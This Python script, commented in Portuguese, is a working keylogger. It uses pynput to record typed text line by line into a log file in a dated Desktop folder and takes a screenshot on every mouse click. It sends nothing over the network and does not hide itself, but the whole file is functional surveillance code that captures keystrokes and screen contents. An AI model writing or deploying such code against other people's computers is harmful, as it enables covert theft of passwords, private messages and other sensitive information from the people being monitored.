from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import os
import pyautogui as py
from pynput.keyboard import Key

# Obtém a data atual e formata
dataAtual = datetime.now()
data = dataAtual.strftime("%d-%m")

# Define o caminho absoluto fora da pasta do código (Desktop, por exemplo)
diretorioBase = os.path.join(os.path.expanduser("~"), "Desktop", "keylogger_" + data)

# Define os diretórios para as fotos e ações digitadas
diretorioFotos = os.path.join(diretorioBase, "fotos")
diretorioAcoes = os.path.join(diretorioBase, "acoes_digitadas")

# Arquivo para armazenar os logs de teclado
arquivoLog = os.path.join(diretorioAcoes, 'Keylogger.log')

# Cria as pastas para capturas de tela e ações digitadas fora da pasta do código
try:
    os.makedirs(diretorioFotos, exist_ok=True)
    os.makedirs(diretorioAcoes, exist_ok=True)
except Exception as e:
    print(f"Erro ao criar diretórios: {e}")

# Variável para armazenar as palavras sendo digitadas
frase_atual = ""

# Função para verificar se a tecla é alfanumérica
def is_alphanumeric(tecla):
    return tecla.isalnum()

# Função para registrar teclas pressionadas
def on_press(tecla):
    global frase_atual
    with open(arquivoLog, 'a') as log:
        try:
            # Verifica se a tecla pressionada é alfanumérica
            if hasattr(tecla, 'char') and is_alphanumeric(tecla.char):
                frase_atual += tecla.char  # Adiciona a letra ou número à frase
            # Se a tecla for "space", adiciona um espaço na frase atual, mas não grava no log
            elif tecla == Key.space:
                frase_atual += ' '  # Adiciona espaço à frase atual
            # Se a tecla for "Enter", grava a frase no arquivo e pula para a próxima linha
            elif tecla == Key.enter:
                log.write(frase_atual + '\n')  # Grava a frase e pula para a próxima linha
                frase_atual = ""  # Reseta a frase atual
        except AttributeError:
            pass  # Ignora teclas que não sejam alfanuméricas

# Função para capturar cliques do mouse e fazer screenshots
def on_click(x, y, button, pressed):
    if pressed:
        minhaPrint = py.screenshot()
        hora = datetime.now()
        horarioPrint = hora.strftime("%H-%M-%S")
        # Salva a captura de tela no diretório de fotos
        minhaPrint.save(os.path.join(diretorioFotos, "printKeylogger_" + horarioPrint + ".jpg"))

# Inicializa os listeners de teclado e mouse
KeyboardListener = KeyboardListener(on_press=on_press)
MouseListener = MouseListener(on_click=on_click)

KeyboardListener.start()
MouseListener.start()
KeyboardListener.join()
MouseListener.join()
